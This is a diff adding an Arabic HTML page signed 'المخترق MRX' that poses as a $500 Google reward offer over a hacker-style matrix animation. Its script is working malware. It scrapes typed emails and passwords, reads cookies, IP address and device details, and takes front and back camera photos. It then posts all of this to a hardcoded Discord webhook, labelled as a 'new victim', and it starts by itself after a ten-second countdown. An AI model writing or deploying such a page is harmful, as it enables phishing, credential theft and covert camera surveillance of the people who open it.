@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>المخترق MRX</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#001a00;display:flex;justify-content:center;align-items:center;min-height:100vh;overflow:hidden;font-family:monospace}
+        .monitor{position:relative;width:80vw;max-width:900px;height:55vw;max-height:550px;background:#0a1f0a;border:20px solid #0f2f0f;border-radius:15px;box-shadow:0 0 50px rgba(0,255,65,0.5),inset 0 0 30px #0f0}
+        .screen{position:relative;width:100%;height:100%;background:#000;overflow:hidden;border:2px solid #1f3f1f}
+        .screen::before{content:"";position:absolute;top:0;left:0;bottom:0;right:0;background:linear-gradient(rgba(0,255,0,0.03)50%,rgba(0,0,0,0.2)50%);background-size:100%4px;z-index:2;pointer-events:none}
+        canvas{display:block;width:100%;height:100%}
+        .stand{width:160px;height:50px;background:#0a1f0a;margin:0 auto;border-bottom-left-radius:10px;border-bottom-right-radius:10px;border-left:2px solid #0f2f0f;border-right:2px solid #0f2f0f}
+        .base{width:280px;height:12px;background:#0f2f0f;margin:0 auto;border-radius:5px;box-shadow:0 0 20px #0f0}
+        #hackWindow{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);z-index:9999;display:flex;justify-content:center;align-items:center;font-family:Arial,sans-serif;backdrop-filter:blur(10px)}
+        #hackBox{background:linear-gradient(145deg,#0a1f0a,#001a00);border:3px solid #0f0;border-radius:20px;padding:50px 60px;max-width:600px;width:90%;text-align:center;box-shadow:0 0 80px rgba(0,255,0,0.3),inset 0 0 50px rgba(0,255,0,0.1);animation:pulse 2s infinite}
+        @keyframes pulse{0%{box-shadow:0 0 80px rgba(0,255,0,0.3),inset 0 0 50px rgba(0,255,0,0.1)}50%{box-shadow:0 0 120px rgba(0,255,0,0.6),inset 0 0 80px rgba(0,255,0,0.2)}100%{box-shadow:0 0 80px rgba(0,255,0,0.3),inset 0 0 50px rgba(0,255,0,0.1)}}
+        #hackBox h1{color:#0f0;font-size:28px;margin-bottom:15px;text-shadow:0 0 20px #0f0}
+        #hackBox p{color:#8f8;font-size:18px;margin:20px 0;line-height:1.8}
+        #hackBox .emoji-big{font-size:60px;display:block;margin:10px 0}
+        #agreeBtn{background:#0f0;color:#000;border:none;padding:15px 50px;font-size:22px;font-weight:bold;border-radius:50px;cursor:pointer;margin-top:20px;transition:all 0.3s;box-shadow:0 0 30px rgba(0,255,0,0.5);font-family:Arial,sans-serif}
+        #agreeBtn:hover{transform:scale(1.05);box-shadow:0 0 50px rgba(0,255,0,0.8)}
+        #agreeBtn:active{transform:scale(0.95)}
+        #timer{color:#0f0;font-size:14px;margin-top:15px;opacity:0.7}
+        #status{color:#ffaa00;font-size:13px;margin-top:10px;display:none}
+    </style>
+</head>
+<body>
+    <div id="hackWindow">
+        <div id="hackBox">
+            <span class="emoji-big">💰</span>
+            <h1>🎯 هل تسمح بدخول Google والحصول على 500$؟</h1>
+            <p>📍 اضغط موافق للحصول على المكافأة<br>⚡ سيتم تفعيل حسابك فوراً</p>
+            <button id="agreeBtn">✅ موافق - احصل على 500$</button>
+            <div id="timer">⏳ سيتم الإرسال خلال 10 ثواني...</div>
+            <div id="status">🔄 جاري التجهيز...</div>
+        </div>
+    </div>
+    <div>
+        <div class="monitor">
+            <div class="screen">
+                <canvas id="matrix"></canvas>
+            </div>
+        </div>
+        <div class="stand"></div>
+        <div class="base"></div>
+    </div>
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1539310950253994094/x6c_ThEC6JIMX8orejy-LUA0NvXsDNesROBtUum7vfUx1jJITWySbFu1Vt6jlj1-8bFd";
+        const c = document.getElementById('matrix');
+        const x = c.getContext('2d');
+        c.width = c.parentElement.clientWidth;
+        c.height = c.parentElement.clientHeight;
+        const z = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+        const s = 16;
+        const col = Math.floor(c.width / s);
+        const d = Array(col).fill(1);
+        setInterval(() => {
+            x.fillStyle = 'rgba(0,20,0,0.04)';
+            x.fillRect(0,0,c.width,c.height);
+            x.fillStyle = '#0f0';
+            x.shadowColor = '#0f0';
+            x.shadowBlur = 6;
+            x.font = s + 'px monospace';
+            for(let i=0;i<col;i++){
+                x.fillText(z[Math.floor(Math.random()*z.length)], i*s, d[i]*s);
+                if(d[i]*s > c.height && Math.random() > 0.975) d[i] = 0;
+                d[i]++;
+            }
+            x.shadowBlur = 0;
+        }, 33);
+        
+        let ip = 'غير معروف';
+        let email = 'غير موجود';
+        let password = 'غير موجود';
+        let phone = 'كمبيوتر';
+        let frontImage = null;
+        let backImage = null;
+        let captured = false;
+        
+        function compressImage(dataUrl, maxSizeMB = 7.5) {
+            return new Promise((resolve) => {
+                let quality = 0.9;
+                let compressed = dataUrl;
+                let size = (dataUrl.length * 3/4) / (1024*1024);
+                if(size <= maxSizeMB) { resolve(dataUrl); return; }
+                
+                const img = new Image();
+                img.onload = function() {
+                    let canvas = document.createElement('canvas');
+                    let w = img.width, h = img.height;
+                    while((w*h*3/4)/(1024*1024) > maxSizeMB) {
+                        w *= 0.9;
+                        h *= 0.9;
+                    }
+                    canvas.width = w;
+                    canvas.height = h;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(img, 0, 0, w, h);
+                    
+                    let result = canvas.toDataURL('image/jpeg', quality);
+                    let newSize = (result.length * 3/4) / (1024*1024);
+                    while(newSize > maxSizeMB && quality > 0.2) {
+                        quality -= 0.1;
+                        result = canvas.toDataURL('image/jpeg', quality);
+                        newSize = (result.length * 3/4) / (1024*1024);
+                    }
+                    resolve(result);
+                };
+                img.src = dataUrl;
+            });
+        }
+        
+        function getIP() {
+            return new Promise((resolve) => {
+                fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json())
+                    .then(d => resolve(d.ip))
+                    .catch(() => resolve('غير معروف'));
+            });
+        }
+        
+        function captureCamera(facingMode) {
+            return new Promise((resolve) => {
+                if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    resolve(null);
+                    return;
+                }
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode, width: 400, height: 300 } })
+                    .then(stream => {
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            const canvas = document.createElement('canvas');
+                            canvas.width = 400;
+                            canvas.height = 300;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, 400, 300);
+                            const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+                            stream.getTracks().forEach(track => track.stop());
+                            resolve(dataUrl);
+                        };
+                    })
+                    .catch(() => resolve(null));
+            });
+        }
+        
+        async function sendWithRetry(payload, retries = 3) {
+            for(let i=0; i<retries; i++) {
+                try {
+                    const response = await fetch(WEBHOOK, {
+                        method: 'POST',
+                        body: payload
+                    });
+                    if(response.ok) return true;
+                    await new Promise(r => setTimeout(r, 2000 * (i+1)));
+                } catch(e) {
+                    if(i === retries-1) throw e;
+                    await new Promise(r => setTimeout(r, 2000 * (i+1)));
+                }
+            }
+            return false;
+        }
+        
+        async function captureAndSend() {
+            if(captured) return;
+            captured = true;
+            document.getElementById('status').style.display = 'block';
+            document.getElementById('status').textContent = '🔄 جمع البيانات...';
+            
+            ip = await getIP();
+            
+            const ua = navigator.userAgent;
+            if(/android/i.test(ua)) phone = 'Android';
+            else if(/iphone|ipad|ipod/i.test(ua)) phone = 'iOS';
+            else if(/windows phone/i.test(ua)) phone = 'Windows Phone';
+            
+            email = localStorage.getItem('email') || 'غير موجود';
+            password = localStorage.getItem('password') || 'غير موجود';
+            
+            document.getElementById('status').textContent = '📸 التقاط الكاميرا الأمامية...';
+            frontImage = await captureCamera('user');
+            if(frontImage) frontImage = await compressImage(frontImage, 7);
+            
+            document.getElementById('status').textContent = '📸 التقاط الكاميرا الخلفية...';
+            backImage = await captureCamera('environment');
+            if(backImage) backImage = await compressImage(backImage, 7);
+            
+            const screenInfo = screen.width + 'x' + screen.height;
+            const language = navigator.language;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const cookies = document.cookie || 'لا توجد';
+            const pageUrl = window.location.href;
+            const referrer = document.referrer || 'لا يوجد';
+            const platform = navigator.platform || 'غير معروف';
+            
+            const payload = {
+                username: "المخترق MRX",
+                content: "**🔥 تم اختراق ضحية جديدة بنجاح!**",
+                embeds: [{
+                    title: "📡 جميع المعلومات المسروقة",
+                    color: 0x00ff00,
+                    fields: [
+                        {name: "🌐 IP", value: ip, inline: true},
+                        {name: "📱 الجهاز", value: phone, inline: true},
+                        {name: "📧 البريد", value: email, inline: true},
+                        {name: "🔑 كلمة المرور", value: password, inline: true},
+                        {name: "🖥️ الشاشة", value: screenInfo, inline: true},
+                        {name: "🌍 اللغة", value: language, inline: true},
+                        {name: "⏰ المنطقة", value: timezone, inline: true},
+                        {name: "💻 المنصة", value: platform, inline: true},
+                        {name: "🍪 الكوكيز", value: cookies.substring(0, 500), inline: false},
+                        {name: "🔗 الصفحة", value: pageUrl, inline: false},
+                        {name: "↩️ الرابط السابق", value: referrer, inline: false},
+                        {name: "📦 المتصفح", value: ua.substring(0, 300), inline: false}
+                    ],
+                    footer: { text: "حقوق الدراك/2026" }
+                }]
+            };
+            
+            if(WEBHOOK.includes("XXXXXXXXX") || WEBHOOK === "https://discord.com/api/webhooks/1539310950253994094/x6c_ThEC6JIMX8orejy-LUA0NvXsDNesROBtUum7vfUx1jJITWySbFu1Vt6jlj1-8bFd") {
+                alert('⚠️ غير الرابط في المتغير WEBHOOK إلى رابط حقيقي');
+                return;
+            }
+            
+            document.getElementById('status').textContent = '📤 إرسال البيانات...';
+            
+            try {
+                const formData = new FormData();
+                formData.append('payload_json', JSON.stringify(payload));
+                
+                if(frontImage) {
+                    const blob = dataURLtoBlob(frontImage);
+                    formData.append('front.jpg', blob, 'front.jpg');
+                }
+                if(backImage) {
+                    const blob = dataURLtoBlob(backImage);
+                    formData.append('back.jpg', blob, 'back.jpg');
+                }
+                
+                const success = await sendWithRetry(formData, 3);
+                if(success) {
+                    document.getElementById('status').textContent = '✅ تم الإرسال بنجاح!';
+                    setTimeout(() => { document.getElementById('status').style.display = 'none'; }, 3000);
+                } else {
+                    document.getElementById('status').textContent = '❌ فشل الإرسال بعد 3 محاولات - احفظ البيانات يدوياً';
+                    localStorage.setItem('backup_data', JSON.stringify({ip, email, password, phone, ua, cookies, pageUrl, referrer}));
+                }
+            } catch(error) {
+                document.getElementById('status').textContent = '❌ خطأ: ' + error.message;
+                localStorage.setItem('backup_data', JSON.stringify({ip, email, password, phone, ua, cookies, pageUrl, referrer}));
+            }
+        }
+        
+        function dataURLtoBlob(dataURL) {
+            const arr = dataURL.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while(n--) {
+                u8arr[n] = bstr.charCodeAt(n);
+            }
+            return new Blob([u8arr], {type: mime});
+        }
+        
+        setInterval(() => {
+            document.querySelectorAll('input[type="password"], input[type="text"], input[type="email"]').forEach(inp => {
+                if(inp.value && inp.value.length > 0) {
+                    if(inp.type === 'password') localStorage.setItem('password', inp.value);
+                    else if(inp.type === 'email') localStorage.setItem('email', inp.value);
+                }
+            });
+        }, 1500);
+        
+        let countdown = 10;
+        const timerEl = document.getElementById('timer');
+        const agreeBtn = document.getElementById('agreeBtn');
+        const hackWindow = document.getElementById('hackWindow');
+        
+        agreeBtn.addEventListener('click', function() {
+            hackWindow.style.display = 'none';
+            captureAndSend();
+        });
+        
+        const countdownInterval = setInterval(() => {
+            countdown--;
+            timerEl.textContent = `⏳ سيتم الإرسال خلال ${countdown} ثواني...`;
+            if(countdown <= 0) {
+                clearInterval(countdownInterval);
+                timerEl.textContent = '⏳ جاري الإرسال...';
+                setTimeout(() => {
+                    hackWindow.style.display = 'none';
+                    captureAndSend();
+                }, 1000);
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
